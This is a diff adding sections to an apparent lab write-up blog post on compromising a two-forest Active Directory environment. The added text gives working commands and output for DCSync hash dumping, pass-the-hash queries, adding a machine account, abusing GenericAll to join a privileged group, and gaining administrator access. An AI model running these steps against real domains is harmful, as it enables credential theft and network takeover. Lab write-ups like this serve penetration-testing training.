@@ -48,6 +48,11 @@ This blog post provides an overview of the lab, including the challenges, statis
   - [DCSync Attack](#dcsync-attack)
 - [Flag 7: Privilege (De)escalation?](#flag-7-privilege-deescalation)
   - [Cross-Forest Enumeration](#cross-forest-enumeration)
+  - [Finding Foreign Group Memberships](#finding-foreign-group-memberships)
+  - [DCSyncing natasha.lim](#dcsyncing-natashalim)
+  - [Foreign MAQ](#foreign-maq)
+  - [Abusing GenericAll on Group, again](#abusing-genericall-on-group-again)
+  - [Local Administrator](#local-administrator)
 
 
 <div class="toc-container">
@@ -119,6 +124,10 @@ This blog post provides an overview of the lab, including the challenges, statis
       </ul>
       <li>
         <a href="#flag-7-privilege-deescalation">Privilege (De)escalation?</a>
+        <ul>
+          <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+          <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
+        </ul>
       </li>
     </ol>
   </div>
@@ -1406,3 +1415,99 @@ INFO: Compressing output into 20250907125945_bloodhound.zip
 After ingesting this data into `BloodHound`, we can now see the `backward.rv` forest in the `BloodHound` interface.
 
 ![](./assets/img/rv-sept/bwbh.png)
+
+## Finding Foreign Group Memberships
+
+We can enumerate for foreign group memberships using the `Queries` tab in `BloodHound`. This is a built-in query, labelled as: `Principals with foreign domain group membership`. We'll find that `natasha.lim@antennae.rv` is a member of the `Maintainers` group in `backward.rv`.
+
+![](./assets/img/rv-sept/ntlm.png)
+
+Additionally, we'll find that the `Maintainers` group has `GenericAll` permissions on the `Sysadmins` group in `backward.rv`.
+
+![](./assets/img/rv-sept/sysadmins.png)
+
+## DCSyncing natasha.lim
+
+As we did before with the `Administrator@antennae.rv` user, we can perform a `DCSync` attack to obtain the `NTLM` hash of the `natasha.lim` user:
+
+```
+~$ nxc smb dc01.antennae.rv -u 'kai.wen.goh' -H '56e7e432c955bfdbb8f57d1248417116' --ntds --user 'natasha.lim'
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\kai.wen.goh:56e7e432c955bfdbb8f57d1248417116 (Pwn3d!)
+SMB         10.5.10.10      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.5.10.10      445    DC01             natasha.lim:1123:aad3b435b51404eeaad3b435b51404ee:0a1bc6b13cd3106322a6d5bbb0293e44:::
+```
+
+## Foreign MAQ
+
+As we did before to enumerate the `MachineAccountQuota` on `antennae.rv`, we can do the same for `backward.rv`. Due to the bidirectional trust, we can use the credentials of any user in `antennae.rv` to query `backward.rv`. In this case, we'll use the credentials of `natasha.lim`:
+
+```
+~$ nxc ldap dc02.backward.rv -u 'natasha.lim' -H '0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' -M maq
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:antennae.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] antennae.rv\natasha.lim:0a1bc6b13cd3106322a6d5bbb0293e44 
+MAQ         10.5.10.12      389    DC02             [*] Getting the MachineAccountQuota
+MAQ         10.5.10.12      389    DC02             MachineAccountQuota: 10
+```
+
+We can create a new computer account in `backward.rv`, using `natasha.lim`'s credentials:
+
+```
+~$ nxc smb dc02.backward.rv -u 'natasha.lim' -H '0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd' 
+SMB         10.5.10.12      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:backward.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.12      445    DC02             [+] antennae.rv\natasha.lim:0a1bc6b13cd3106322a6d5bbb0293e44 
+ADD-COMP... 10.5.10.12      445    DC02             Successfully added the machine account: "gatari$" with Password: "P@ssw0rd"
+```
+
+## Abusing GenericAll on Group, again
+
+Now that we have a computer account in `backward.rv`, we can use the `GenericAll` permissions that the `Maintainers` group has on the `Sysadmins` group to add our computer account to the `Sysadmins` group:
+
+```
+~$ bloodyAD --host 'dc02.backward.rv' -u 'natasha.lim' -p ':0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' add groupMember 'sysadmins' 'gatari$'                                          
+[+] gatari$ added to sysadmins
+```
+
+We can verify that our computer account is indeed a member of the `Sysadmins` group:
+
+```
+~$ nxc ldap dc02.backward.rv -u 'gatari$' -p 'P@ssw0rd' -M whoami                                                        
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\gatari$:P@ssw0rd 
+WHOAMI      10.5.10.12      389    DC02             Name: gatari
+WHOAMI      10.5.10.12      389    DC02             sAMAccountName: gatari$
+WHOAMI      10.5.10.12      389    DC02             Enabled: Yes
+WHOAMI      10.5.10.12      389    DC02             Password Never Expires: No
+WHOAMI      10.5.10.12      389    DC02             Last logon: Never
+WHOAMI      10.5.10.12      389    DC02             Password Last Set: Never
+WHOAMI      10.5.10.12      389    DC02             Bad Password Count: 0
+WHOAMI      10.5.10.12      389    DC02             Distinguished Name: CN=gatari,CN=Computers,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             Member of: CN=Sysadmins,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             User SID: S-1-5-21-2163652167-2436585246-2491459670-1605
+```
+
+## Local Administrator
+
+Now that we are part of the `sysadmins` group, we can enumerate for local administrator access on machines in the `backward.rv` domain. We can do this with `nxc`:
+
+```
+~$ nxc smb srv01.backward.rv -u 'gatari$' -p 'P@ssw0rd'                                                                                                  
+SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.13      445    SRV01            [+] backward.rv\gatari$:P@ssw0rd (Pwn3d!)
+```
+
+The presence of the `(Pwn3d!)` message indicates that `gatari$` has local administrator access on `srv01.backward.rv`. This is likely because the `Sysadmins` group is a member of the `Administrators` group on `srv01.backward.rv`. We can `SSH` into `srv01.backward.rv` as `gatari$`.
+
+```
+~$ sshpass -p 'P@ssw0rd' ssh 'gatari$'@srv01.backward.rv
+PS C:\Users\gatari$> whoami
+backward\gatari$
+```
+
+
+And grab `flag7.txt`:
+
+```
+PS C:\Users\gatari$> cat C:\Users\Administrator\Desktop\flag7.txt
+RV{f0r3I6n_GRoUP_mEMBeRSH1p_!$_pR3t7Y_4nNoyin9_549d3e2a7fd475283f4ce5f93f489a76}
+```
